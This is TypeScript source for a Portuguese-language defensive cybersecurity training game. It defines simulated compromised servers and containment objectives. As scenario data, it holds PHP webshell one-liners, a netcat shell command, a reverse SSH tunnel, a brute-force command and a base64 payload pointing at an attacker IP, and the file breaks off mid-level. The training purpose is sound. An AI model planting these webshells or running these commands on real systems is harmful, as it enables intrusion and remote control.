// INITIUM — modelo do mundo simulado (filesystem, processos, sockets, firewall)

export type FileNode = {
  kind: "f" | "d";
  mode: string;
  owner: string;
  size: number;
  content?: string;
  hidden?: boolean;
};

export type Proc = {
  pid: number;
  user: string;
  cpu: number;
  mem: number;
  cmd: string;
  evil?: boolean;
};

export type Sock = {
  proto: string;
  port: number;
  pid: number;
  addr: string;
  svc: string;
  evil?: boolean;
};

export type World = {
  cwd: string;
  fs: Record<string, FileNode>;
  procs: Proc[];
  socks: Sock[];
  blocked: number[];
  attackerIp: string;
  attackerDomain: string;
  attackerBlocked: boolean;
  flags: Record<string, boolean>;
  history: string[];
};

export type ObjectiveRequirement = {
  id: string;
  label: string;
  check: (w: World) => boolean;
};

export type ObjectiveStatus = {
  complete: boolean;
  requirementsMet: number;
  requirementsTotal: number;
};

export type Objective = {
  id: string;
  titulo: string;
  detalhe: string;
  hint: string;
  chips: string[];
  /** Optional checklist for objectives that require multiple independent actions. */
  requirements?: ObjectiveRequirement[];
  check: (w: World) => boolean;
};

export type Level = {
  id: number;
  codinome: string;
  setor: string;
  alvo: string;
  ip: string;
  resumo: string;
  attackerIp: string;
  attackerDomain: string;
  procs: Proc[];
  socks: Sock[];
  extraFiles: Record<string, FileNode>;
  objetivos: Objective[];
};

/* ---------- helpers de checagem ---------- */
const gone = (w: World, p: string) => !w.fs[p];
const mode = (w: World, p: string) => w.fs[p]?.mode;
const flag = (k: string) => (w: World) => !!w.flags[k];
const noEvilProc = (w: World) => !w.procs.some((p) => p.evil);
const hasBlocked = (p: number) => (w: World) => w.blocked.includes(p);
const processStopped = (pid: number) => (w: World) => !w.procs.some((p) => p.pid === pid);
const fileRemoved = (path: string) => (w: World) => gone(w, path);
const rootkitScanClean = (w: World) => !!w.flags.rootkitScan;

/** Keep a task pending until every declared requirement and its final objective check pass. */
export function getObjectiveStatus(objective: Objective, world: World): ObjectiveStatus {
  const requirements = objective.requirements?.length
    ? objective.requirements
    : [{ id: objective.id, label: objective.titulo, check: objective.check }];
  const requirementsMet = requirements.filter((requirement) => requirement.check(world)).length;
  const complete = requirementsMet === requirements.length && objective.check(world);
  return { complete, requirementsMet, requirementsTotal: requirements.length };
}

/* ---------- base do filesystem ---------- */
function baseFS(): Record<string, FileNode> {
  const f = (
    mode: string,
    owner: string,
    size: number,
    content = "",
    hidden = false
  ): FileNode => ({ kind: "f", mode, owner, size, content, hidden });
  const d = (mode: string, owner: string): FileNode => ({
    kind: "d",
    mode,
    owner,
    size: 4096,
  });
  return {
    "/": d("drwxr-xr-x", "root"),
    "/etc": d("drwxr-xr-x", "root"),
    "/etc/ssh": d("drwxr-xr-x", "root"),
    "/etc/ssh/sshd_config": f(
      "-rw-r--r--",
      "root",
      3287,
      "Port 22\nPermitRootLogin yes\nPasswordAuthentication yes\nX11Forwarding no\nPermitEmptyPasswords yes\nUsePAM no\n"
    ),
    "/etc/ssh/sshd_config.bak": f(
      "-rw-r--r--",
      "root",
      3260,
      "Port 22\nPermitRootLogin no\nPasswordAuthentication no\n"
    ),
    "/etc/ssh/ssh_host_rsa_key": f(
      "-rw-r--r--",
      "root",
      2602,
      "-----BEGIN RSA PRIVATE KEY-----\n0x5f3a91c4e77b20da\n-----END RSA PRIVATE KEY-----\n"
    ),
    "/etc/hosts": f("-rw-r--r--", "root", 221, "127.0.0.1 localhost\n::1 localhost\n"),
    "/etc/passwd": f("-rw-r--r--", "root", 1832, "root:x:0:0::/root:/bin/bash\n"),
    "/etc/crontab": f(
      "-rw-r--r--",
      "root",
      512,
      "# /etc/crontab: sistema de rotinas agendadas\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n"
    ),
    "/etc/iptables.rules": f(
      "-rw-r--r--",
      "root",
      118,
      "*filter\n:INPUT ACCEPT [0:0]\n:FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [0:0]\nCOMMIT\n"
    ),
    "/var": d("drwxr-xr-x", "root"),
    "/var/log": d("drwxr-xr-x", "root"),
    "/var/log/auth.log": f(
      "-rw-r-----",
      "syslog",
      20480,
      "feb 11 03:12:44 srv sshd[812]: Failed password for invalid user admin from 189.34.77.203 port 51122\nfeb 11 03:12:51 srv sshd[812]: Accepted password for root from 189.34.77.203 port 51122\nfeb 11 03:13:02 srv session opened for user root\n"
    ),
    "/var/log/syslog": f(
      "-rw-r-----",
      "syslog",
      90211,
      "kernel: eth0: link up 1000Mbps\ncron: (root) CMD (/usr/lib/.update)\n"
    ),
    "/var/www": d("drwxr-xr-x", "www-data"),
    "/var/www/html": d("drwxrwxrwx", "www-data"),
    "/var/www/html/index.php": f("-rwxrwxrwx", "www-data", 4120, "<?php // portal nacional de operacoes ?>"),
    "/root": d("drwx------", "root"),
    "/root/.ssh": d("drwx------", "root"),
    "/root/.bash_history": f("-rw-------", "root", 402, "nmap localhost\nexit\n"),
    "/tmp": d("drwxrwxrwt", "root"),
  };
}

/* ---------- 6 FASES — CAMPANHA CONCENTRADA DE 1H30 COM CONTADOR ÚNICO ---------- */
const ALL_LEVELS: Level[] = [
  // FASE 01: BANCO CENTRAL / PIX
  {
    id: 1,
    codinome: "SIGILO",
    setor: "BANCO CENTRAL · SPI/PIX & SPED",
    alvo: "srv-br01.core.bb.gov.br",
    ip: "10.12.4.31",
    resumo:
      "Intrusão em nó central de compensação financeira. Um serviço não catalogado escuta na borda (porta 4444) e um webshell ativo foi injetado no portal. Contenha o vetor antes da liquidação bancária.",
    attackerIp: "189.34.77.203",
    attackerDomain: "host203.petro-net.br",
    procs: [
      { pid: 812, user: "root", cpu: 0.4, mem: 1.2, cmd: "/usr/sbin/sshd -D" },
      { pid: 1044, user: "www-data", cpu: 1.8, mem: 3.1, cmd: "apache2 -k start" },
      { pid: 2211, user: "postgres", cpu: 6.2, mem: 12.4, cmd: "postgres: writer process" },
      { pid: 31337, user: "root", cpu: 24.7, mem: 8.9, cmd: "/tmp/.x/.fdoor --reverse 189.34.77.203", evil: true },
    ],
    socks: [
      { proto: "tcp", port: 22, pid: 812, addr: "0.0.0.0", svc: "ssh" },
      { proto: "tcp", port: 80, pid: 1044, addr: "0.0.0.0", svc: "http" },
      { proto: "tcp", port: 443, pid: 1044, addr: "0.0.0.0", svc: "https" },
      { proto: "tcp", port: 5432, pid: 2211, addr: "127.0.0.1", svc: "postgresql" },
      { proto: "tcp", port: 4444, pid: 31337, addr: "0.0.0.0", svc: "?????", evil: true },
    ],
    extraFiles: {
      "/var/www/html/cmd.php": {
        kind: "f",
        mode: "-rwxrwxrwx",
        owner: "www-data",
        size: 218,
        content: "<?php /* b374k shell */ eval(base64_decode($_POST['x'])); system($_GET['c']); ?>",
      },
    },
    objetivos: [
      {
        id: "scan",
        titulo: "Mapear portas, serviços e processos expostos",
        detalhe: "Faça o inventário da rede e confira os processos em execução.",
        hint: "nmap -sV localhost",
        chips: ["nmap -sV localhost", "netstat -tulpn"],
        requirements: [
          { id: "network-scan", label: "Mapear portas e serviços da rede", check: flag("scanNetwork") },
          { id: "process-scan", label: "Inspecionar processos em execução", check: flag("scanProcesses") },
        ],
        check: (w) => !!w.flags.scanNetwork && !!w.flags.scanProcesses,
      },
      {
        id: "kill",
        titulo: "Encerrar o backdoor ativo",
        detalhe: "Localize o processo malicioso e mate-o pelo PID.",
        hint: "kill -9 31337",
        chips: ["ps aux", "kill -9 31337"],
        check: noEvilProc,
      },
      {
        id: "fw",
        titulo: "Selar a porta 4444 no firewall",
        detalhe: "Descarte no iptables o tráfego da porta usada pelo invasor.",
        hint: "iptables -A INPUT -p tcp --dport 4444 -j DROP",
        chips: ["iptables -A INPUT -p tcp --dport 4444 -j DROP", "ufw deny 4444"],
        check: hasBlocked(4444),
      },
      {
        id: "shell",
        titulo: "Erradicar o webshell",
        detalhe: "Apague o artefato malicioso encontrado em /var/www/html.",
        hint: "rm -f /var/www/html/cmd.php",
        chips: ["ls -la /var/www/html", "rm -f /var/www/html/cmd.php"],
        check: (w) => gone(w, "/var/www/html/cmd.php"),
      },
    ],
  },

  // FASE 02: TRIBUNAL SUPERIOR ELEITORAL / APURAÇÃO
  {
    id: 2,
    codinome: "URNA",
    setor: "TRIBUNAL SUPERIOR ELEITORAL · Totalização",
    alvo: "apur02.tse.jus.br",
    ip: "10.44.1.90",
    resumo:
      "Ataque coordenado contra o servidor de apuração. Força bruta intensa no SSH e processo de exfiltração vazando tabelas de boletins com permissões indevidas.",
    attackerIp: "45.161.240.77",
    attackerDomain: "vps.milagrinhodedeus.net.br",
    procs: [
      { pid: 771, user: "root", cpu: 0.3, mem: 1.0, cmd: "/usr/sbin/sshd -D" },
      { pid: 1180, user: "tse", cpu: 2.2, mem: 5.6, cmd: "/opt/apuracao/worker --slot 3" },
      { pid: 2402, user: "root", cpu: 41.9, mem: 2.0, cmd: "hydra -L /tmp/.x/u.txt -P /tmp/.x/p.txt ssh", evil: true },
      { pid: 4096, user: "tse", cpu: 18.3, mem: 6.7, cmd: "/var/tmp/.urna-sync --exfil boletim.db", evil: true },
    ],
    socks: [
      { proto: "tcp", port: 22, pid: 771, addr: "0.0.0.0", svc: "ssh" },
      { proto: "tcp", port: 80, pid: 771, addr: "0.0.0.0", svc: "http" },
      { proto: "tcp", port: 8080, pid: 4096, addr: "0.0.0.0", svc: "http-alt", evil: true },
    ],
    extraFiles: {
      "/etc/tse/boletim.db": {
        kind: "f",
        mode: "-rwxrwxrwx",
        owner: "tse",
        size: 882113,
        content: "SQLite format 3 — boletim de urnas 2026 · dados criptografados",
      },
      "/var/tmp/.urna-sync": {
        kind: "f",
        mode: "-rwxrwxrwx",
        owner: "tse",
        size: 90411,
        hidden: true,
        content: "ELF 64-bit · beacon HTTP para 45.161.240.77",
      },
    },
    objetivos: [
      {
        id: "scan",
        titulo: "Levantar a superfície do nó",
        detalhe: "Mapeie portas e processos ativos antes de agir.",
        hint: "netstat -tulpn",
        chips: ["netstat -tulpn", "ps aux"],
        check: flag("scan"),
      },
      {
        id: "auth",
        titulo: "Achar o IP de ataque no log de acesso",
        detalhe: "Filtre as tentativas de login malsucedidas em /var/log/auth.log.",
        hint: "tail -n 20 /var/log/auth.log",
        chips: ["tail -n 20 /var/log/auth.log", "grep 'Failed password' /var/log/auth.log"],
        check: flag("attackerKnown"),
      },
      {
        id: "trace",
        titulo: "Atribuir o proprietário do IP hostil",
        detalhe: "Consulte o WHOIS do endereço identificado.",
        hint: "whois 45.161.240.77",
        chips: ["whois 45.161.240.77", "traceroute 45.161.240.77"],
        check: flag("traced"),
      },
      {
        id: "blockip",
        titulo: "Derrubar a rota do invasor no firewall",
        detalhe: "Bloqueie todo o tráfego vindo do IP atacante.",
        hint: "iptables -A INPUT -s 45.161.240.77 -j DROP",
        chips: ["iptables -A INPUT -s 45.161.240.77 -j DROP", "ufw deny from 45.161.240.77"],
        check: (w) => w.attackerBlocked,
      },
      {
        id: "kill",
        titulo: "Eliminar força bruta e exfiltração",
        detalhe: "Mate os processos hostis em execução (2402 e 4096).",
        hint: "kill -9 4096",
        chips: ["kill -9 4096", "kill -9 2402"],
        requirements: [
          { id: "pid-2402", label: "Encerrar processo de força bruta 2402", check: processStopped(2402) },
          { id: "pid-4096", label: "Encerrar processo de exfiltração 4096", check: processStopped(4096) },
        ],
        check: noEvilProc,
      },
      {
        id: "perm",
        titulo: "Corrigir permissões do boletim",
        detalhe: "Ajuste o arquivo /etc/tse/boletim.db para leitura e escrita exclusiva (600).",
        hint: "chmod 600 /etc/tse/boletim.db",
        chips: ["ls -la /etc/tse", "chmod 600 /etc/tse/boletim.db"],
        check: (w) => mode(w, "/etc/tse/boletim.db") === "-rw-------",
      },
    ],
  },

  // FASE 03: OPERADOR NACIONAL DO SISTEMA ELÉTRICO / ITAIPU
  {
    id: 3,
    codinome: "FREQUÊNCIA",
    setor: "ONS · Operador Nacional do Sistema Elétrico",
    alvo: "scada-rtu07.ons.org.br",
    ip: "10.8.200.14",
    resumo:
      "Controlador RTU de subestação de 500 kV recebendo ordens de desligamento falsificadas. Canal IRC de comando e controle ativo e rootkit implantado.",
    attackerIp: "91.219.236.10",
    attackerDomain: "node10.tor-exit.ro",
    procs: [
      { pid: 640, user: "root", cpu: 0.2, mem: 0.8, cmd: "/sbin/init" },
      { pid: 988, user: "scada", cpu: 3.4, mem: 7.2, cmd: "/opt/ons/rtu-daemon --unit 7" },
      { pid: 5150, user: "root", cpu: 33.1, mem: 4.4, cmd: "/tmp/.x/kmod -i eth0 --inject", evil: true },
      { pid: 5151, user: "nobody", cpu: 12.6, mem: 1.9, cmd: "nc -lk 6667 -e /bin/sh", evil: true },
    ],
    socks: [
      { proto: "tcp", port: 22, pid: 640, addr: "0.0.0.0", svc: "ssh" },
      { proto: "tcp", port: 502, pid: 988, addr: "0.0.0.0", svc: "modbus" },
      { proto: "tcp", port: 102, pid: 988, addr: "0.0.0.0", svc: "s7comm" },
      { proto: "tcp", port: 6667, pid: 5151, addr: "0.0.0.0", svc: "irc-botnet", evil: true },
    ],
    extraFiles: {
      "/tmp/.x/kmod": {
        kind: "f",
        mode: "-rwxrwxrwx",
        owner: "root",
        size: 147203,
        hidden: true,
        content: "ELF 64-bit · LKM rootkit, esconde sockets e processos",
      },
      "/var/log/.cache": {
        kind: "f",
        mode: "-rw-r--r--",
        owner: "root",
        size: 512,
        hidden: true,
        content: "UEtPWC1ERVBMT1k6IGN1cnVsIGh0dHA6Ly85MS4yMTkuMjM2LjEwL3guYmlu",
      },
    },
    objetivos: [
      {
        id: "scan",
        titulo: "Inventariar a RTU industrial",
        detalhe: "Mapeie os sockets e processos com ss e ps.",
        hint: "ss -tulpn",
        chips: ["ss -tulpn", "ps aux"],
        check: flag("scan"),
      },
      {
        id: "dump",
        titulo: "Confirmar a exfiltração de pacotes",
        detalhe: "Capture o tráfego direcionado para o host externo.",
        hint: "tcpdump -i eth0 host 91.219.236.10",
        chips: ["tcpdump -i eth0 host 91.219.236.10", "tcpdump -i eth0 port 6667"],
        check: flag("dumped"),
      },
      {
        id: "decode",
        titulo: "Decodificar o payload hostil",
        detalhe: "Decodifique o arquivo oculto /var/log/.cache com base64.",
        hint: "base64 -d /var/log/.cache",
        chips: ["cat /var/log/.cache", "base64 -d /var/log/.cache"],
        check: flag("decoded"),
      },
      {
        id: "kill",
        titulo: "Neutralizar os agentes maliciosos",
        detalhe: "Encerre ambos os processos hostis em execução.",
        hint: "kill -9 5150",
        chips: ["kill -9 5150", "kill -9 5151"],
        requirements: [
          { id: "pid-5150", label: "Encerrar agente rootkit 5150", check: processStopped(5150) },
          { id: "pid-5151", label: "Encerrar agente de shell 5151", check: processStopped(5151) },
        ],
        check: noEvilProc,
      },
      {
        id: "fw",
        titulo: "Bloquear o canal IRC de comando",
        detalhe: "Feche a porta 6667 no firewall.",
        hint: "iptables -A INPUT -p tcp --dport 6667 -j DROP",
        chips: ["iptables -A INPUT -p tcp --dport 6667 -j DROP", "ufw deny 6667"],
        check: hasBlocked(6667),
      },
      {
        id: "rk",
        titulo: "Erradicar o rootkit e validar",
        detalhe: "Remova /tmp/.x/kmod e rode a varredura com chkrootkit.",
        hint: "chkrootkit",
        chips: ["ls -la /tmp/.x", "rm -f /tmp/.x/kmod", "chkrootkit"],
        requirements: [
          { id: "remove-kmod", label: "Remover módulo oculto", check: fileRemoved("/tmp/.x/kmod") },
          { id: "scan-clean", label: "Confirmar limpeza com chkrootkit", check: rootkitScanClean },
        ],
        check: (w) => gone(w, "/tmp/.x/kmod") && !!w.flags.rootkitScan,
      },
    ],
  },

  // FASE 04: SATÉLITE DE DEFESA SGDC-1 / GUARATIBA
  {
    id: 4,
    codinome: "ÓRBITA",
    setor: "SGDC-1 · Estação Terrena de Guaratiba / FAB",
    alvo: "telemetry.gsgdc.br",
    ip: "10.66.0.7",
    resumo:
      "Enlace de telemetria do satélite geoestacionário sob intervenção clandestina. Chaves criptográficas do host vazaram e uma sessão persistente sequestra o canal.",
    attackerIp: "103.152.220.66",
    attackerDomain: "cloud.vultr-user-66.net",
    procs: [
      { pid: 707, user: "root", cpu: 0.5, mem: 1.1, cmd: "/usr/sbin/sshd -D" },
      { pid: 1502, user: "satcom", cpu: 8.8, mem: 14.2, cmd: "/opt/sgdc/telemetry-link --band KA" },
      { pid: 6161, user: "root", cpu: 27.4, mem: 3.3, cmd: "sshd: root@notty", evil: true },
      { pid: 6162, user: "root", cpu: 9.1, mem: 2.1, cmd: "/usr/lib/.update --persist", evil: true },
    ],
    socks: [
      { proto: "tcp", port: 22, pid: 707, addr: "0.0.0.0", svc: "ssh" },
      { proto: "tcp", port: 161, pid: 1502, addr: "0.0.0.0", svc: "snmp" },
      { proto: "tcp", port: 4404, pid: 6161, addr: "0.0.0.0", svc: "backconnect", evil: true },
    ],
    extraFiles: {
      "/usr/lib/.update": {
        kind: "f",
        mode: "-rwxr-xr-x",
        owner: "root",
        size: 30117,
        hidden: true,
        content: "ELF 64-bit · persistência via chave SSH adulterada",
      },
    },
    objetivos: [
      {
        id: "scan",
        titulo: "Auditar o nó de telemetria",
        detalhe: "Levante processos e conexões de rede ativas.",
        hint: "ps aux",
        chips: ["ps aux", "netstat -tulpn"],
        check: flag("scan"),
      },
      {
        id: "conf",
        titulo: "Verificar a configuração do daemon SSH",
        detalhe: "Inspecione /etc/ssh/sshd_config para checar acessos autorizados.",
        hint: "cat /etc/ssh/sshd_config",
        chips: ["cat /etc/ssh/sshd_config", "grep PermitRootLogin /etc/ssh/sshd_config"],
        check: flag("sshdRead"),
      },
      {
        id: "keys",
        titulo: "Girar as chaves de acesso do satélite",
        detalhe: "Gere um novo par de chaves RSA para invalidar as credenciais vazadas.",
        hint: "ssh-keygen -f /etc/ssh/ssh_host_rsa_key -N ''",
        chips: ["ssh-keygen -f /etc/ssh/ssh_host_rsa_key -N ''"],
        check: flag("keysRotated"),
      },
      {
        id: "restart",
        titulo: "Reiniciar o daemon de acesso seguro",
        detalhe: "Aplique a nova configuração reiniciando o serviço sshd.",
        hint: "systemctl restart sshd",
        chips: ["systemctl restart sshd", "systemctl status sshd"],
        check: flag("sshdRestarted"),
      },
      {
        id: "kill",
        titulo: "Expulsar sessões clandestinas",
        detalhe: "Encerre os processos não autorizados vinculados ao backconnect.",
        hint: "kill -9 6161",
        chips: ["kill -9 6161", "kill -9 6162"],
        requirements: [
          { id: "pid-6161", label: "Encerrar sessão invasora 6161", check: processStopped(6161) },
          { id: "pid-6162", label: "Encerrar persistência 6162", check: processStopped(6162) },
        ],
        check: noEvilProc,
      },
      {
        id: "fw",
        titulo: "Fechar a porta do backconnect",
        detalhe: "Bloqueie a porta 4404 com iptables.",
        hint: "iptables -A INPUT -p tcp --dport 4404 -j DROP",
        chips: ["iptables -A INPUT -p tcp --dport 4404 -j DROP", "ufw deny 4404"],
        check: hasBlocked(4404),
      },
    ],
  },

  // FASE 05: CABOS SUBMARINOS CPR-MAR / SANTOS–FORTALEZA
  {
    id: 5,
    codinome: "ABISMO",
    setor: "CPR-MAR · Estação de Amarração Santos–Fortaleza",
    alvo: "landing-pt.cprmar.gov.br",
    ip: "10.90.9.9",
    resumo:
      "Ataque em três vetores simultâneos contra a amarração do cabo óptico submarino nacional. Webshell perl, túnel reverso SSH e backdoor no kernel.",
    attackerIp: "201.17.44.19",
    attackerDomain: "core2.sp.br-net.net.br",
    procs: [
      { pid: 512, user: "root", cpu: 0.2, mem: 0.7, cmd: "/sbin/init" },
      { pid: 901, user: "www-data", cpu: 2.1, mem: 4.3, cmd: "apache2 -k start" },
      { pid: 7777, user: "root", cpu: 38.8, mem: 5.1, cmd: "/tmp/.x/.fdoor --reverse 201.17.44.19", evil: true },
      { pid: 8888, user: "www-data", cpu: 15.2, mem: 2.2, cmd: "perl /var/www/html/.c99.pl", evil: true },
      { pid: 9999, user: "root", cpu: 21.7, mem: 3.6, cmd: "ssh -R 0.0.0.0:9001:localhost:22 root@201.17.44.19", evil: true },
    ],
    socks: [
      { proto: "tcp", port: 22, pid: 512, addr: "0.0.0.0", svc: "ssh" },
      { proto: "tcp", port: 80, pid: 901, addr: "0.0.0.0", svc: "http" },
      { proto: "tcp", port: 443, pid: 901, addr: "0.0.0.0", svc: "https" },
      { proto: "tcp", port: 4444, pid: 7777, addr: "0.0.0.0", svc: "?????", evil: true },
      { proto: "tcp", port: 9001, pid: 9999, addr: "0.0.0.0", svc: "tunnel", evil: true },
    ],
    extraFiles: {
      "/var/www/html/.c99.pl": {
        kind: "f",
        mode: "-rwxrwxrwx",
        owner: "www-data",
        size: 61220,
        hidden: true,
        content: "#!/usr/bin/perl # c99 madshell",
      },
      "/var/www/html/portal.php": {
        kind: "f",
        mode: "-rwxrwxrwx",
        owner: "www-data",
        size: 3310,
        content: "<?php system($_REQUEST['cmd']); ?>",
      },
      "/tmp/.x/.fdoor": {
        kind: "f",
        mode: "-rwxrwxrwx",
        owner: "root",
        size: 88112,
        hidden: true,
        content: "ELF 64-bit · backdoor reverso",
      },
    },
    objetivos: [
      {
        id: "scan",
        titulo: "Identificar todos os vetores",
        detalhe: "Portas, processos e arquivos suspeitos.",
        hint: "nmap -sV localhost",
        chips: ["nmap -sV localhost", "ps aux"],
        check: flag("scan"),
      },
      {
        id: "kill",
        titulo: "Eliminar os três processos hostis",
        detalhe: "Encerre os PIDs 7777, 8888 e 9999.",
        hint: "kill -9 7777",
        chips: ["kill -9 7777", "kill -9 8888", "kill -9 9999"],
        requirements: [
          { id: "pid-7777", label: "Encerrar backdoor 7777", check: processStopped(7777) },
          { id: "pid-8888", label: "Encerrar webshell 8888", check: processStopped(8888) },
          { id: "pid-9999", label: "Encerrar túnel reverso 9999", check: processStopped(9999) },
        ],
        check: noEvilProc,
      },
      {
        id: "fw1",
        titulo: "Selar a porta 4444",
        detalhe: "Corte a conexão do backdoor reverso.",
        hint: "iptables -A INPUT -p tcp --dport 4444 -j DROP",
        chips: ["iptables -A INPUT -p tcp --dport 4444 -j DROP", "ufw deny 4444"],
        check: hasBlocked(4444),
      },
      {
        id: "fw2",
        titulo: "Selar a porta do túnel 9001",
        detalhe: "Derrube o túnel SSH clandestino.",
        hint: "ufw deny 9001",
        chips: ["ufw deny 9001", "iptables -A INPUT -p tcp --dport 9001 -j DROP"],
        check: hasBlocked(9001),
      },
      {
        id: "blockip",
        titulo: "Descartar o tráfego do servidor C2",
        detalhe: "Bloqueie o IP 201.17.44.19 no firewall.",
        hint: "iptables -A INPUT -s 201.17.44.19 -j DROP",
        chips: ["iptables -A INPUT -s 201.17.44.19 -j DROP", "ufw deny from 201.17.44.19"],
        check: (w) => w.attackerBlocked,
      },
      {
        id: "shell",
        titulo: "Expurgar artefatos e webshells",
        detalhe: "Remova portal.php e .c99.pl de /var/www/html.",
        hint: "rm -f /var/www/html/portal.php",
        chips: ["rm -f /var/www/html/portal.php", "rm -f /var/www/html/.c99.pl"],
        requirements: [
          { id: "remove-portal", label: "Remover portal.php", check: fileRemoved("/var/www/html/portal.php") },
          { id: "remove-c99", label: "Remover webshell .c99.pl", check: fileRemoved("/var/www/html/.c99.pl") },
        ],
        check: (w) => gone(w, "/var/www/html/portal.php") && gone(w, "/var/www/html/.c99.pl"),
      },
      {
        id: "rk",
        titulo: "Validar a integridade do nó",
        detalhe: "Remova o artefato /tmp/.x/.fdoor e execute chkrootkit.",
        hint: "chkrootkit",
        chips: ["rm -f /tmp/.x/.fdoor", "chkrootkit"],
        requirements: [
          { id: "remove-fdoor", label: "Remover backdoor .fdoor", check: fileRemoved("/tmp/.x/.fdoor") },
          { id: "scan-clean", label: "Confirmar limpeza com chkrootkit", check: rootkitScanClean },
        ],
        check: (w) => gone(w, "/tmp/.x/.fdoor") && !!w.flags.rootkitScan,
      },
    ],
  },

  // FASE 06: ELETRONUCLEAR / USINAS NUCLEARES ANGRA 1 E 2
  {
    id: 6,
    codinome: "ATÔMICA",
    setor: "ELETRONUCLEAR · Usinas Nucleares Angra 1 e 2",
    alvo: "coolant-scada.angra.eletronuclear.gov.br",
    ip: "10.70.1.12",
    resumo:
      "Tentativa de manipulação nas bombas do circuito de refrigeração primária do reator nuclear. Injeção de DLL/SO malicioso no PLC Siemens S7 porta 102.",
    attackerIp: "77.88.55.90",
    attackerDomain: "proxy90.nuclear-leak.ru",
    procs: [
      { pid: 501, user: "root", cpu: 0.2, mem: 0.7, cmd: "/sbin/init" },
      { pid: 1205, user: "reactor", cpu: 9.3, mem: 16.4, cmd: "/opt/angra/coolant-monitor --unit 2" },
      { pid: 7102, user: "root", cpu: 31.4, mem: 6.8, cmd: "/tmp/.stx/stx-modbus-tamper --pump 4", evil: true },
    ],
    socks: [
      { proto: "tcp", port: 22, pid: 501, addr: "0.0.0.0", svc: "ssh" },
      { proto: "tcp", port: 102, pid: 7102, addr: "0.0.0.0", svc: "s7comm", evil: true },
    ],
    extraFiles: {
      "/tmp/.stx/stx-modbus-tamper": {
        kind: "f",
        mode: "-rwxrwxrwx",
        owner: "root",
        size: 112000,
        hidden: true,
        content: "ELF 64-bit · Siemens S7-1500 PLC firmware modifier",
      },
      "/etc/angra/coolant.conf": {
        kind: "f",
        mode: "-rwxrwxrwx",
        owner: "reactor",
        size: 1024,
        content: "# Parametros criticos do circuito de refrigeracao\nMAX_TEMP_C=315\nFLOW_RATE_LPS=14200\n",
      },
    },
    objetivos: [
      {
        id: "scan",
        titulo: "Varredura do sistema SCADA nuclear",
        detalhe: "Inspecione sockets industriais e processos do reator.",
        hint: "nmap -sV localhost",
        chips: ["nmap -sV localhost", "ps aux"],
        check: flag("scan"),
      },
      {
        id: "kill",
        titulo: "Matar o adulterador de bombas",
        detalhe: "Encerre o processo stx-modbus-tamper (PID 7102).",
        hint: "kill -9 7102",
        chips: ["kill -9 7102"],
        check: noEvilProc,
      },
      {
        id: "fw",
        titulo: "Sellar a porta externa 102",
        detalhe: "Bloqueie o acesso externo à porta Siemens S7.",
        hint: "iptables -A INPUT -p tcp --dport 102 -j DROP",
        chips: ["iptables -A INPUT -p tcp --dport 102 -j DROP", "ufw deny 102"],
        check: hasBlocked(102),
      },
      {
        id: "perm",
        titulo: "Restaurar permissões da configuração do reator",
        detalhe: "Proteja /etc/angra/coolant.conf com chmod 600.",
        hint: "chmod 600 /etc/angra/coolant.conf",
        chips: ["chmod 600 /etc/angra/coolant.conf", "ls -la /etc/angra"],
        check: (w) => mode(w, "/etc/angra/coolant.conf") === "-rw-------",
      },
      {
        id: "rm",
        titulo: "Remover o binário hostil",
        detalhe: "Exclua /tmp/.stx/stx-modbus-tamper e valide.",
        hint: "rm -f /tmp/.stx/stx-modbus-tamper",
        chips: ["rm -f /tmp/.stx/stx-modbus-tamper", "chkrootkit"],
        check: (w) => gone(w, "/tmp/.stx/stx-modbus-tamper"),
      },
    ],
  },

  // FASE 07: MINISTÉRIO DA DEFESA / COMANDO DE DEFESA CIBERNÉTICA
  {
    id: 7,
    codinome: "SOBERANIA",
    setor: "MINISTÉRIO DA DEFESA · ComDCiber (Comando Cibernético)",
    alvo: "comdciber-gw.defesa.mil.br",
    ip: "10.1.1.1",
    resumo:
      "Ataque APT avançado de estado-nação contra o gateway do Comando Conjunto de Operações Cibernéticas. Túnel clandestino WireGuard porta 51820 e alteração em /etc/hosts.",
    attackerIp: "194.26.29.11",
    attackerDomain: "apt-state.threat-actor.su",
    procs: [
      { pid: 512, user: "root", cpu: 0.3, mem: 1.0, cmd: "/sbin/init" },
      { pid: 1600, user: "comdciber", cpu: 6.2, mem: 15.0, cmd: "/opt/defesa/ids-sensor --promisc" },
      { pid: 8200, user: "root", cpu: 31.5, mem: 6.0, cmd: "/usr/bin/wireguard-covert -i wg0", evil: true },
    ],
    socks: [
      { proto: "tcp", port: 22, pid: 512, addr: "0.0.0.0", svc: "ssh" },
      { proto: "tcp", port: 51820, pid: 8200, addr: "0.0.0.0", svc: "wireguard", evil: true },
    ],
    extraFiles: {
      "/tmp/.defesa_leak": {
        kind: "f",
        mode: "-rwxrwxrwx",
        owner: "root",
        size: 92000,
        hidden: true,
        content: "ELF 64-bit · APT nation-state memory scraping implant",
      },
    },
    objetivos: [
      {
        id: "scan",
        titulo: "Mapear o gateway de defesa",
        detalhe: "Inspecione processos e sockets do nó de comando.",
        hint: "netstat -tulpn",
        chips: ["netstat -tulpn", "ps aux"],
        check: flag("scan"),
      },
      {
        id: "kill",
        titulo: "Derrubar o túnel WireGuard clandestino",
        detalhe: "Encerre o processo wireguard-covert (PID 8200).",
        hint: "kill -9 8200",
        chips: ["kill -9 8200"],
        check: noEvilProc,
      },
      {
        id: "fw",
        titulo: "Bloquear a porta 51820",
        detalhe: "Feche a porta VPN não autorizada no iptables.",
        hint: "iptables -A INPUT -p tcp --dport 51820 -j DROP",
        chips: ["iptables -A INPUT -p tcp --dport 51820 -j DROP", "ufw deny 51820"],
        check: hasBlocked(51820),
      },
      {
        id: "trace",
        titulo: "Identificar o operador de ameaça estatal",
        detalhe: "Execute whois no IP 194.26.29.11.",
        hint: "whois 194.26.29.11",
        chips: ["whois 194.26.29.11", "traceroute 194.26.29.11"],
        check: flag("traced"),
      },
      {
        id: "blockip",
        titulo: "Descartar pacotes da infraestrutura APT",
        detalhe: "Bloqueie o IP 194.26.29.11 no firewall.",
        hint: "iptables -A INPUT -s 194.26.29.11 -j DROP",
        chips: ["iptables -A INPUT -s 194.26.29.11 -j DROP", "ufw deny from 194.26.29.11"],
        check: (w) => w.attackerBlocked,
      },
      {
        id: "rm",
        titulo: "Remover o implante de memória e validar",
        detalhe: "Exclua /tmp/.defesa_leak e audite com chkrootkit.",
        hint: "chkrootkit",
        chips: ["rm -f /tmp/.defesa_leak", "chkrootkit"],
        requirements: [
